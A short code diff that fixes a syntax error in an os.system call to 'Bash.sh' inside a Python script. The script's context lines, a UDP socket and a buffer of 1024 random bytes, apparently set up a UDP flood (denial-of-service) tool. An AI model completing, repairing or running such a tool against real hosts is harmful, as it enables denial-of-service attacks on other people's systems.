@@ -8,7 +8,7 @@ import sys
 import time
 import socket
 import random
-os system("bash Bash.sh")
+os.system("bash Bash.sh")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 os.system("clear")
